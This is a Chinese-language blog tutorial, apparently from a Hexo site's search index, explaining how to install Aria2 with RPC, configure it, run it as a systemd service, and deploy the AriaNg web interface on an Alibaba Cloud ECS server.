    <link href="/2021/02/09/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%83%A8%E7%BD%B2%E4%B8%8B%E8%BD%BD%E5%99%A8Aria2+AriaNg/"/>
    <url>/2021/02/09/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%83%A8%E7%BD%B2%E4%B8%8B%E8%BD%BD%E5%99%A8Aria2+AriaNg/</url>
    
    <content type="html"><![CDATA[<h2 id="1-注意"><a href="#1-注意" class="headerlink" title="1.注意"></a>1.注意</h2><p>服务器应当先配置好LAMP环境</p><p>下载unzip工具</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install unzip<br></code></pre></div></td></tr></table></figure><h2 id="2-Aria2的安装与RPC的部署"><a href="#2-Aria2的安装与RPC的部署" class="headerlink" title="2.Aria2的安装与RPC的部署"></a>2.Aria2的安装与RPC的部署</h2><h3 id="Aria2的安装"><a href="#Aria2的安装" class="headerlink" title="Aria2的安装"></a>Aria2的安装</h3><p>连接ECS服务器终端，键入</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt update<br>apt dist-upgrade<br>apt-get install aria2<br>aria2c -v <span class="hljs-comment">#检查aria2c是否正确安装</span><br></code></pre></div></td></tr></table></figure><h3 id="RPC的部署"><a href="#RPC的部署" class="headerlink" title="RPC的部署"></a>RPC的部署</h3><p>配置文件：aria.conf,aria2.session</p><p>配置目录：aria2c默认下载目录&#x2F;data&#x2F;aria2&#x2F;Downloads&#x2F;和上述两个文件存放目录&#x2F;data&#x2F;aria2&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /data/aria2/Downloads/ <span class="hljs-comment">#创建目录</span><br><span class="hljs-built_in">touch</span> /data/aria2/aria2.&#123;conf,session&#125;<br></code></pre></div></td></tr></table></figure><p>在aria2.conf中写入以下内容</p><p><strong>注意：Line68: rpc-secret&#x3D;<TOKEN>中的<TOKEN>应当改为要设置的RPC密码</strong></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#允许rpc  </span><br>enable-rpc=<span class="hljs-literal">true</span>  <br><span class="hljs-comment">#允许所有来源, web界面跨域权限需要  </span><br>rpc-allow-origin-all=<span class="hljs-literal">true</span>  <br><span class="hljs-comment">#允许非外部访问  </span><br>rpc-listen-all=<span class="hljs-literal">true</span><br><span class="hljs-comment">## &#x27;#&#x27;开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ##</span><br><span class="hljs-comment">## 被注释的选项填写的是默认值, 建议在需要修改时再取消注释  ##</span><br> <br><span class="hljs-comment">## 文件保存相关 ##</span><br> <br><span class="hljs-comment"># 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置</span><br><span class="hljs-built_in">dir</span>=/data/aria2/Downloads<br><span class="hljs-comment"># 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span><br><span class="hljs-comment">#disk-cache=32M</span><br><span class="hljs-comment"># 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span><br><span class="hljs-comment"># 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span><br><span class="hljs-comment"># falloc和trunc则需要文件系统和内核支持</span><br><span class="hljs-comment"># NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项</span><br><span class="hljs-comment">#file-allocation=none</span><br><span class="hljs-comment"># 断点续传</span><br><span class="hljs-built_in">continue</span>=<span class="hljs-literal">true</span><br> <br><span class="hljs-comment">## 下载连接相关 ##</span><br> <br><span class="hljs-comment"># 最大同时下载任务数, 运行时可修改, 默认:5</span><br>max-concurrent-downloads=3<br><span class="hljs-comment"># 同一服务器连接数, 添加时可指定, 默认:1</span><br>max-connection-per-server=5<br><span class="hljs-comment"># 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span><br><span class="hljs-comment"># 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span><br>min-split-size=10M<br><span class="hljs-comment"># 单个任务最大线程数, 添加时可指定, 默认:5</span><br><span class="hljs-comment">#split=5</span><br><span class="hljs-comment"># 整体下载速度限制, 运行时可修改, 默认:0</span><br><span class="hljs-comment">#max-overall-download-limit=0</span><br><span class="hljs-comment"># 单个任务下载速度限制, 默认:0</span><br><span class="hljs-comment">#max-download-limit=0</span><br><span class="hljs-comment"># 整体上传速度限制, 运行时可修改, 默认:0</span><br><span class="hljs-comment">#max-overall-upload-limit=0</span><br><span class="hljs-comment"># 单个任务上传速度限制, 默认:0</span><br><span class="hljs-comment">#max-upload-limit=0</span><br><span class="hljs-comment"># 禁用IPv6, 默认:false</span><br>disable-ipv6=<span class="hljs-literal">true</span><br><span class="hljs-comment"># 连接超时时间, 默认:60</span><br><span class="hljs-comment">#timeout=60</span><br><span class="hljs-comment"># 最大重试次数, 设置为0表示不限制重试次数, 默认:5</span><br><span class="hljs-comment">#max-tries=5</span><br><span class="hljs-comment"># 设置重试等待的秒数, 默认:0</span><br><span class="hljs-comment">#retry-wait=0</span><br> <br><span class="hljs-comment">## 进度保存相关 ##</span><br> <br><span class="hljs-comment"># 从会话文件中读取下载任务</span><br>input-file=/data/aria2/aria2.session<br><span class="hljs-comment"># 在Aria2退出时保存`错误/未完成`的下载任务到会话文件</span><br>save-session=/etc/aria2/aria2.session<br><span class="hljs-comment"># 定时保存会话, 0为退出时才保存, 需1.16.1以上版本, 默认:0</span><br>save-session-interval=60<br> <br><span class="hljs-comment">## RPC相关设置 ##</span><br> <br><span class="hljs-comment"># 启用RPC, 默认:false</span><br>enable-rpc=<span class="hljs-literal">true</span><br><span class="hljs-comment"># 允许所有来源, 默认:false</span><br>rpc-allow-origin-all=<span class="hljs-literal">true</span><br><span class="hljs-comment"># 允许非外部访问, 默认:false</span><br>rpc-listen-all=<span class="hljs-literal">true</span><br><span class="hljs-comment"># 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span><br><span class="hljs-comment">#event-poll=select</span><br><span class="hljs-comment"># RPC监听端口, 端口被占用时可以修改, 默认:6800</span><br>rpc-listen-port=6800<br><span class="hljs-comment"># 设置的RPC授权令牌, v1.18.4新增功能, 取代 --rpc-user 和 --rpc-passwd 选项</span><br>rpc-secret=&lt;TOKEN&gt;<br><span class="hljs-comment"># 设置的RPC访问用户名, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><br><span class="hljs-comment">#rpc-user=&lt;USER&gt;</span><br><span class="hljs-comment"># 设置的RPC访问密码, 此选项新版已废弃, 建议改用 --rpc-secret 选项</span><br><span class="hljs-comment">#rpc-passwd=&lt;PASSWD&gt;</span><br><span class="hljs-comment"># 是否启用 RPC 服务的 SSL/TLS 加密,</span><br><span class="hljs-comment"># 启用加密后 RPC 服务需要使用 https 或者 wss 协议连接</span><br><span class="hljs-comment">#rpc-secure=true</span><br><span class="hljs-comment"># 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,</span><br><span class="hljs-comment"># 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span><br><span class="hljs-comment">#rpc-certificate=/path/to/certificate.pem</span><br><span class="hljs-comment"># 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件</span><br><span class="hljs-comment">#rpc-private-key=/path/to/certificate.key</span><br> <br><span class="hljs-comment">## BT/PT下载相关 ##</span><br> <br><span class="hljs-comment"># 当下载的是一个种子(以.torrent结尾)时, 自动开始BT任务, 默认:true</span><br><span class="hljs-comment">#follow-torrent=true</span><br><span class="hljs-comment"># BT监听端口, 当端口被屏蔽时使用, 默认:6881-6999</span><br>listen-port=51413<br><span class="hljs-comment"># 单个种子最大连接数, 默认:55</span><br><span class="hljs-comment">#bt-max-peers=55</span><br><span class="hljs-comment"># 打开DHT功能, PT需要禁用, 默认:true</span><br>enable-dht=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 打开IPv6 DHT功能, PT需要禁用</span><br><span class="hljs-comment">#enable-dht6=false</span><br><span class="hljs-comment"># DHT网络监听端口, 默认:6881-6999</span><br><span class="hljs-comment">#dht-listen-port=6881-6999</span><br><span class="hljs-comment"># 本地节点查找, PT需要禁用, 默认:false</span><br><span class="hljs-comment">#bt-enable-lpd=false</span><br><span class="hljs-comment"># 种子交换, PT需要禁用, 默认:true</span><br>enable-peer-exchange=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 每个种子限速, 对少种的PT很有用, 默认:50K</span><br><span class="hljs-comment">#bt-request-peer-speed-limit=50K</span><br><span class="hljs-comment"># 客户端伪装, PT需要</span><br>peer-id-prefix=-TR2770-<br>user-agent=Transmission/2.77<br>peer-agent=Transmission/2.77<br><span class="hljs-comment"># 当种子的分享率达到这个数时, 自动停止做种, 0为一直做种, 默认:1.0</span><br>seed-ratio=0<br><span class="hljs-comment"># 强制保存会话, 即使任务已经完成, 默认:false</span><br><span class="hljs-comment"># 较新的版本开启后会在任务完成后依然保留.aria2文件</span><br><span class="hljs-comment">#force-save=false</span><br><span class="hljs-comment"># BT校验相关, 默认:true</span><br><span class="hljs-comment">#bt-hash-check-seed=true</span><br><span class="hljs-comment"># 继续之前的BT任务时, 无需再次校验, 默认:false</span><br>bt-seed-unverified=<span class="hljs-literal">true</span><br><span class="hljs-comment"># 保存磁力链接元数据为种子文件(.torrent文件), 默认:false</span><br>bt-save-metadata=<span class="hljs-literal">true</span><br></code></pre></div></td></tr></table></figure><h3 id="设置Aria2c开机自启动"><a href="#设置Aria2c开机自启动" class="headerlink" title="设置Aria2c开机自启动"></a>设置Aria2c开机自启动</h3><p>在系统默认自启动目录下注册aria2c服务：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">vim /lib/systemd/system/aria2c.service<br></code></pre></div></td></tr></table></figure><p>按i，然后粘入如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[Unit]<br>Description=Aria2c<br> <br>[Service]<br>TimeoutStartSec=0<br>ExecStart=/usr/bin/aria2c --conf-path=/data/aria2/aria2.conf<br>ExecReload=/bin/kill -HUP <span class="hljs-variable">$MAINPID</span><br>KillMode=process<br>Restart=on-failure<br>RestartSec=42s<br> <br>[Install]<br>WantedBy=multi-user.target<br></code></pre></div></td></tr></table></figure><p>按shift，输入wq，回车。然后启动aria2c服务并查看运行状态：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl <span class="hljs-built_in">enable</span> aria2c<br>systemctl restart aria2c<br>systemctl status aria2c<br></code></pre></div></td></tr></table></figure><p>如果输出的结果中含有“Active: active (running)”字样，则aria2c自启动服务注册成功。</p><h2 id="3-AriaNg的安装与配置"><a href="#3-AriaNg的安装与配置" class="headerlink" title="3.AriaNg的安装与配置"></a>3.AriaNg的安装与配置</h2><p>在终端键入以下内容，具体版本号需查阅<a href="https://github.com/mayswind/AriaNg/releases">Github release</a></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget https://github.com/mayswind/AriaNg/releases/download/1.1.7/AriaNg-1.1.7.zip <span class="hljs-comment">#下载</span><br><span class="hljs-built_in">mkdir</span> /var/www/html/ariang <span class="hljs-comment">#创建ariang文件夹</span><br>unzip -d /var/www/html/ariang AriaNg-1.1.7.zip <span class="hljs-comment">#具体zip包名参考wget时的包名</span><br><span class="hljs-built_in">chmod</span> 755 /var/www/html/ariang<br></code></pre></div></td></tr></table></figure><p>在浏览器访问http:&#x2F;&#x2F;&lt;IP地址&gt;&#x2F;ariang，确认配置成功</p><p>在AriaNg设置-&gt;RPC设置中填写在rpc-secret中设置的密码。输完密码后刷新页面，如果左侧栏底部的Aria2状态显示为下图中的“<strong>已连接</strong>”则表明配置成功</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>server</tag>
      
      <tag>aria2</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
